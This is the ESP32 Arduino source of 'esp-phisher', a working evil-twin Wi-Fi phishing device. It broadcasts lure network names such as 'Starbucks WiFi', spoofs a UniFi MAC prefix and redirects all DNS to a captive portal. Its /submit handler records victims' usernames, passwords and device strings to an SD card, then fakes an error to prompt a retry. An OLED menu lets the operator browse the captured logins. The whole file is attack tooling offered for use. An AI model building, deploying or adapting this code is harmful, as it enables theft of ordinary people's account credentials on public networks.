// esp-phisher v1.8.2  (June 2025)
// github.com/socalit

#include <Arduino.h>
#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include <SD.h>
#include <SPI.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <EEPROM.h>
#include <esp_wifi.h>
#include <AsyncTCP.h>

#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 32
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);

#define EEPROM_SIZE 64
#define SSID_OFFSET 4
#define MAX_SSID_LEN 32
#define LOGSZ_OFFSET 0

#define SD_CS 5
#define BTN_UP 32
#define BTN_DOWN 33
#define BTN_ENTER 25
#define BTN_BACK 26
#define LED_TX 12
#define LED_RX 13
#define LED_PWR 14

const uint8_t UNIFI_OUI[3] = {0x28, 0x70, 0x4E};
const byte DNS_PORT = 53;

DNSServer dnsServer;
AsyncWebServer server(80);

String ap_ssid = "Free Public WiFi";
const char* ssidOptions[] = {
  "Free Public WiFi", "Airport Free WiFi", "Starbucks WiFi", "Xfinity WiFi",
  "Hotel Guest WiFi", "Free Open WiFi", "McDonald's WiFi"
};
int ssidIndex = 0;
String currentBg = "bg1.jpg";
enum MenuState { HOME, MENU, VIEW_LOG, SET_SSID };
MenuState currentState = HOME;
int selectedMenu = 0;
unsigned long lastInteraction = 0;
const unsigned long TIMEOUT_MS = 15000;
unsigned int lastLogSize = 0;
int logScroll = 0;

void saveSSID(const String& s) {
  EEPROM.begin(EEPROM_SIZE);
  int len = min((int)s.length(), MAX_SSID_LEN - 1);
  for (int i = 0; i < len; i++) EEPROM.write(SSID_OFFSET + i, s[i]);
  EEPROM.write(SSID_OFFSET + len, '\0');
  EEPROM.commit(); EEPROM.end();
}

String loadSSID() {
  EEPROM.begin(EEPROM_SIZE);
  char buf[MAX_SSID_LEN];
  for (int i = 0; i < MAX_SSID_LEN; i++) {
    buf[i] = EEPROM.read(SSID_OFFSET + i);
    if (buf[i] == '\0') break;
  }
  buf[MAX_SSID_LEN - 1] = '\0';
  EEPROM.end();
  String s(buf);
  if (!s.length()) {
    s = "Free Public WiFi";
    saveSSID(s);
  }
  return s;
}

void saveLogSize(unsigned int s) {
  EEPROM.begin(EEPROM_SIZE);
  EEPROM.writeUShort(LOGSZ_OFFSET, s);
  EEPROM.commit(); EEPROM.end();
}

void loadLastLogSize() {
  EEPROM.begin(EEPROM_SIZE);
  lastLogSize = EEPROM.readUShort(LOGSZ_OFFSET);
  EEPROM.end();
}

unsigned int getLogSize() {
  if (!SD.exists("/log.txt")) return 0;
  File f = SD.open("/log.txt");
  unsigned int sz = f.size();
  f.close();
  return sz;
}

void setUniFiMac() {
  uint8_t m[6];
  memcpy(m, UNIFI_OUI, 3);
  esp_fill_random(&m[3], 3);
  m[0] &= 0xFE;
  esp_wifi_set_mac(WIFI_IF_AP, m);
}

void blinkLed(int pin) {
  while (true) {
    digitalWrite(pin, HIGH); delay(250);
    digitalWrite(pin, LOW);  delay(250);
  }
}

bool checkRequiredFiles() {
  const char* files[] = {
    "/index.html", "/admin.html", "/success.html", "/terms.html",
    "/img/facebook.png", "/img/google.png", "/img/instagram.png",
    "/img/poweredByUniFi.svg", "/img/tiktok.png",
    "/img/bg1.jpg", "/img/bg2.jpg", "/img/bg3.jpg", "/img/bg4.jpg"
  };
  for (const char* f : files) {
    if (!SD.exists(f)) {
      Serial.printf("[ERROR] Missing: %s\n", f);
      display.clearDisplay();
      display.setCursor(0, 0);
      display.print("Missing file:");
      display.setCursor(0, 10);
      display.print(f);
      display.display();
      blinkLed(LED_PWR);
    } else {
      Serial.printf("[OK] Found: %s\n", f);
    }
  }
  return true;
}

void drawHomeScreen() {
  display.clearDisplay(); display.setCursor(0, 0);
  display.print("SSID: "); display.println(ap_ssid.substring(0, 16));
  display.setCursor(0, 10);
  int c = WiFi.softAPgetStationNum();
  display.printf("Clients: %d", c);
  digitalWrite(LED_RX, c ? HIGH : (millis() % 1000 < 500 ? HIGH : LOW));
  display.setCursor(0, 20);
  bool unread = getLogSize() > lastLogSize;
  display.printf("New Login: %s", unread ? "YES" : "NO");
  digitalWrite(LED_TX, unread ? HIGH : LOW);
  display.display();
}

void drawMenu() {
  const char* items[] = { "View Logins", "Clear Logs", "Set SSID", "Reboot" };
  int totalItems = sizeof(items) / sizeof(items[0]);

  int start = selectedMenu;
  if (start > totalItems - 3) start = totalItems - 3;
  if (start < 0) start = 0;

  display.clearDisplay();
  for (int i = 0; i < 3 && (start + i) < totalItems; i++) {
    display.setCursor(0, i * 10);
    if ((start + i) == selectedMenu) display.print("> ");
    display.print(items[start + i]);
  }
  display.display();
}

void drawLogView() {
  display.clearDisplay();
  File f = SD.exists("/log.txt") ? SD.open("/log.txt") : File();
  if (!f) {
    display.setCursor(0, 0);
    display.println("No logins.");
  } else {
    int totalLines = 0;
    while (f.available()) {
      f.readStringUntil('\n');
      totalLines++;
    }
    f.close();

    if (logScroll > totalLines - 3) logScroll = max(0, totalLines - 3);
    if (logScroll < 0) logScroll = 0;

    f = SD.open("/log.txt");
    int lineNum = 0;
    while (f.available()) {
      String line = f.readStringUntil('\n');
      if (lineNum >= logScroll && lineNum < logScroll + 3) {
        display.setCursor(0, (lineNum - logScroll) * 10);
        display.print(line.substring(0, 20));
      }
      lineNum++;
    }
    f.close();
    saveLogSize(getLogSize());
    lastLogSize = getLogSize();
  }
  display.display();
}

void drawSSIDSelector() {
  display.clearDisplay();
  display.setCursor(0, 0);
  display.println("Select SSID:");
  display.setCursor(0, 10);
  display.print("> ");
  display.println(ssidOptions[ssidIndex]);
  display.display();
}

void handleButtons() {
  int n = sizeof(ssidOptions) / sizeof(ssidOptions[0]);
  if (digitalRead(BTN_UP) == LOW) {
    lastInteraction = millis();
    if (currentState == MENU) selectedMenu = (selectedMenu + 3) % 4;
    else if (currentState == SET_SSID) ssidIndex = (ssidIndex - 1 + n) % n;
    else if (currentState == VIEW_LOG) logScroll--;
    delay(180);
  }
  if (digitalRead(BTN_DOWN) == LOW) {
    lastInteraction = millis();
    if (currentState == MENU) selectedMenu = (selectedMenu + 1) % 4;
    else if (currentState == SET_SSID) ssidIndex = (ssidIndex + 1) % n;
    else if (currentState == VIEW_LOG) logScroll++;
    delay(180);
  }
  if (digitalRead(BTN_ENTER) == LOW) {
    lastInteraction = millis();
    if (currentState == HOME) currentState = MENU;
    else if (currentState == MENU) {
      if (selectedMenu == 0) currentState = VIEW_LOG;
      else if (selectedMenu == 1) { SD.remove("/log.txt"); saveLogSize(0); lastLogSize = 0; currentState = HOME; }
      else if (selectedMenu == 2) currentState = SET_SSID;
      else if (selectedMenu == 3) ESP.restart();
    } else if (currentState == VIEW_LOG) currentState = MENU;
    else if (currentState == SET_SSID) {
      ap_ssid = ssidOptions[ssidIndex]; saveSSID(ap_ssid); WiFi.softAP(ap_ssid); currentState = HOME;
    }
    delay(180);
  }
  if (digitalRead(BTN_BACK) == LOW) {
    lastInteraction = millis(); currentState = HOME; delay(180);
  }
}

void setup() {
  Serial.begin(115200);
  pinMode(BTN_UP, INPUT_PULLUP); pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_ENTER, INPUT_PULLUP); pinMode(BTN_BACK, INPUT_PULLUP);
  pinMode(LED_TX, OUTPUT); pinMode(LED_RX, OUTPUT); pinMode(LED_PWR, OUTPUT);
  digitalWrite(LED_PWR, LOW);

  Wire.begin(21, 22);
  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) { Serial.println("OLED fail"); blinkLed(LED_PWR); }


  display.clearDisplay(); display.setTextSize(1); display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0); display.println("OLED OK!"); display.display();
  delay(600);

  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.println("esp-phisher v1.8.2");
  display.println("github.com/socalit");
  display.println("Booting...");
  display.display();
  delay(2000);

  if (!SD.begin(SD_CS)) blinkLed(LED_PWR);
  if (!checkRequiredFiles()) blinkLed(LED_PWR);

  loadLastLogSize();
  ap_ssid = loadSSID();

  WiFi.mode(WIFI_OFF); delay(50); WiFi.mode(WIFI_AP);
  setUniFiMac(); WiFi.softAP(ap_ssid);
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
  esp_wifi_set_ps(WIFI_PS_NONE); esp_wifi_set_max_tx_power(78);

  server.serveStatic("/", SD, "/").setDefaultFile("index.html");
  server.serveStatic("/admin.html", SD, "/admin.html").setCacheControl("no-cache");
  server.serveStatic("/log.txt", SD, "/log.txt").setCacheControl("no-cache");

  server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(200, "text/html", "<html><body>Redirecting...</body></html>");
  });
  server.on("/gen_204", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(200, "text/html", "<html><body>Redirecting...</body></html>");
  });
  server.on("/ncsi.txt", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(200, "text/plain", "Microsoft NCSI");
  });
  server.on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest *request){
    request->redirect("/");
  });
  server.on("/connecttest.txt", HTTP_GET, [](AsyncWebServerRequest *request){
    request->redirect("/");
  });

  server.on("/submit", HTTP_POST, [](AsyncWebServerRequest *req){
    if (!req->hasParam("platform", true) || !req->hasParam("username", true) || !req->hasParam("password", true)) {
      req->send(400, "text/plain", "Missing parameters"); return;
    }
    String platform = req->getParam("platform", true)->value();
    String line = "[" + platform + "] User: " + req->getParam("username", true)->value() + " | Pass: " +
                 req->getParam("password", true)->value() + " | Device: " + req->header("User-Agent") + "\n";
    File f = SD.open("/log.txt", FILE_APPEND); if (f) { f.print(line); f.close(); }
    digitalWrite(LED_TX, HIGH); delay(300); digitalWrite(LED_TX, LOW);
    if (platform == "Google" && req->getParam("username", true)->value().indexOf('@') == -1) {
      req->redirect("/index.html?error=email"); return;
    }
    req->redirect("/index.html?error=1");
  });

  server.on("/mark-read", HTTP_POST, [](AsyncWebServerRequest *r){
    unsigned int sz = getLogSize(); saveLogSize(sz); lastLogSize = sz;
    digitalWrite(LED_TX, LOW); r->send(200, "text/plain", "Marked");
  });

  server.on("/clear", HTTP_POST, [](AsyncWebServerRequest *r){
    if (r->hasParam("key", true) && r->getParam("key", true)->value() == "3000") {
      SD.remove("/log.txt"); saveLogSize(0); lastLogSize = 0;
      r->send(200, "text/plain", "Cleared");
    } else r->send(403, "text/plain", "Unauthorized");
  });

  server.on("/bg", HTTP_GET, [](AsyncWebServerRequest *r){
    r->send(200, "text/plain", currentBg);
  });

  server.on("/bg", HTTP_POST, [](AsyncWebServerRequest *r){
    if (!r->hasParam("bg", true)) {
      r->send(400, "text/plain", "bg param required"); return;
    }
    String src = r->getParam("bg", true)->value();
    if (!SD.exists(src)) {
      r->send(404, "text/plain", "file not found"); return;
    }
    File in = SD.open(src, FILE_READ);
    File out = SD.open("/img/bg.jpg", FILE_WRITE);
    uint8_t buf[512]; size_t n;
    while ((n = in.read(buf, sizeof(buf)))) out.write(buf, n);
    in.close(); out.close();
    currentBg = src.substring(src.lastIndexOf('/') + 1);
    r->send(200, "text/plain", "OK");
  });

  server.on("/ssid", HTTP_GET, [](AsyncWebServerRequest *r){
    r->send(200, "text/plain", loadSSID());
  });

  server.on("/ssid", HTTP_POST, [](AsyncWebServerRequest *r){
    if (!r->hasParam("ssid", true)) {
      r->send(400, "text/plain", "Missing SSID"); return;
    }
    String n = r->getParam("ssid", true)->value(); n.trim();
    if (n.length() && n.length() <= 31) {
      ap_ssid = n; saveSSID(n); WiFi.softAP(n);
      r->send(200, "text/plain", "SSID updated");
    } else {
      r->send(400, "text/plain", "Invalid SSID");
    }
  });

  server.onNotFound([](AsyncWebServerRequest *request){
    request->redirect("/");
  });

  digitalWrite(LED_PWR, HIGH);
  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  handleButtons();
  switch (currentState) {
    case HOME: drawHomeScreen(); break;
    case MENU: drawMenu(); break;
    case VIEW_LOG: drawLogView(); break;
    case SET_SSID: drawSSIDSelector(); break;
  }
  if (millis() - lastInteraction > TIMEOUT_MS && currentState != HOME)
    currentState = HOME;
  delay(100);
}
